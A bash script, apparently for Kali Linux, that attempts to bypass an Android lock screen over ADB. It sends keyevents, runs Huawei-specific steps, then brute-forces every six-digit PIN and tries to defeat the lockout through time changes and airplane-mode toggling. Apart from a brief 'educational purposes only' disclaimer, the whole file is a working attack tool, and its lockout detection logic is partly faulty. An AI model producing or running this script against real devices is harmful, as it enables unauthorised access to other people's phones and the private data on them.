#!/bin/bash
# Android Lock Screen Bypass Script for Kali Linux
# DISCLAIMER: This script is for educational purposes only.
# Using this on devices without permission is illegal.

echo "Android Lock Screen Bypass Tool"
echo "==============================="
echo "WARNING: Use only on devices you own or have permission to test."
echo

# Check if running as root
if [ "$(id -u)" != "0" ]; then
   echo "This script must be run as root" 1>&2
   exit 1
fi

# Check for required tools
command -v adb >/dev/null 2>&1 || { echo "Error: ADB is required. Install with 'apt install adb'"; exit 1; }

# Initialize ADB
echo "Initializing ADB server..."
adb kill-server
adb start-server

# Check for connected devices with improved detection
echo "Checking for connected Android devices..."
DEVICES=$(adb devices | grep -v "List" | grep -v "^$" | wc -l)
if [ $DEVICES -eq 0 ]; then
    echo "No devices found. Please connect your device via USB."
    echo "Make sure:"
    echo "1. USB debugging is enabled on your device"
    echo "2. You've authorized this computer on your device"
    echo "3. Your device is not in 'Charging only' mode"
    echo "4. You have the correct USB drivers installed"
    echo
    echo "For Huawei devices (like P20 Lite):"
    echo "- Go to Settings > System > Developer options > USB debugging"
    echo "- You may need to tap 'Build number' 7 times in Settings > About phone to enable developer options"
    echo
    echo "Waiting for device connection..."
    adb wait-for-device
    echo "Device connected!"
else
    echo "Device detected!"
fi

# Get device information
echo "Getting device information..."
DEVICE_MODEL=$(adb shell getprop ro.product.model 2>/dev/null)
ANDROID_VERSION=$(adb shell getprop ro.build.version.release 2>/dev/null)
echo "Device model: $DEVICE_MODEL"
echo "Android version: $ANDROID_VERSION"

# Check if device is locked
echo "Checking device lock state..."
LOCKED=$(adb shell dumpsys window | grep -E 'mDreamingLockscreen=true|mShowingLockscreen=true|isStatusBarKeyguard=true')
if [ -z "$LOCKED" ]; then
    echo "Device appears to be already unlocked or lock screen detection failed."
    echo "Continuing anyway..."
else
    echo "Device is locked. Proceeding with bypass attempts."
fi

# Attempt direct bypass using ADB (requires USB debugging enabled)
echo "Attempting direct bypass via ADB..."
adb shell input keyevent 82
adb shell input keyevent 4
sleep 1

# Check if bypass worked
STILL_LOCKED=$(adb shell dumpsys window | grep -E 'mDreamingLockscreen=true|mShowingLockscreen=true|isStatusBarKeyguard=true')
if [ -z "$STILL_LOCKED" ]; then
    echo "Direct bypass successful!"
    exit 0
else
    echo "Direct bypass failed. Trying alternative methods..."
fi

# Try device-specific methods
if [[ "$DEVICE_MODEL" == *"Huawei"* ]] || [[ "$DEVICE_MODEL" == *"HUAWEI"* ]]; then
    echo "Detected Huawei device. Trying Huawei-specific methods..."
    # Huawei-specific bypass attempts
    adb shell am start -n com.android.settings/.Settings
    sleep 1
fi

# If direct bypass fails, try brute force approach
echo "Starting PIN brute force attack..."
echo "This will attempt all PINs from 000000 to 999999"
echo "Press Ctrl+C to stop at any time"

# Function to try a PIN
try_pin() {
    local pin=$1
    formatted_pin=$(printf "%06d" $pin)
    echo "Trying PIN: $formatted_pin"
    
    # Wake up device
    adb shell input keyevent 26
    sleep 0.5
    adb shell input swipe 500 1500 500 500
    sleep 0.5
    
    # Enter PIN
    for (( i=0; i<${#formatted_pin}; i++ )); do
        digit=${formatted_pin:$i:1}
        adb shell input keyevent $(( digit + 7 ))
        sleep 0.1
    done
    
    # Press enter
    adb shell input keyevent 66
    
    # Small delay to avoid device lockout
    sleep 1
    
    # More comprehensive check if we're still at lock screen
    adb shell dumpsys window | grep -E 'mDreamingLockscreen=true|mShowingLockscreen=true|isStatusBarKeyguard=true' > /dev/null
    if [ $? -ne 0 ]; then
        echo "SUCCESS! PIN found: $formatted_pin"
        return 0
    fi
    
    # If device shows lockout, try to bypass it
    adb shell dumpsys window | grep -q "mShowingLockscreen=true"
    if [ $? -eq 0 ]; then
        echo "Detected lockout, attempting to bypass..."
        # Try to reset lockout by changing device time
        adb shell settings put global auto_time 0
        adb shell date `date +%m%d%H%M%Y.%S`
        sleep 2
        
        # For some devices, try airplane mode toggle
        adb shell settings put global airplane_mode_on 1
        adb shell am broadcast -a android.intent.action.AIRPLANE_MODE
        sleep 1
        adb shell settings put global airplane_mode_on 0
        adb shell am broadcast -a android.intent.action.AIRPLANE_MODE
        sleep 1
    fi
    
    return 1
}

# Main brute force loop
for pin in $(seq 0 999999); do
    try_pin $pin
    if [ $? -eq 0 ]; then
        break
    fi
done

echo "Attack completed."
adb kill-server
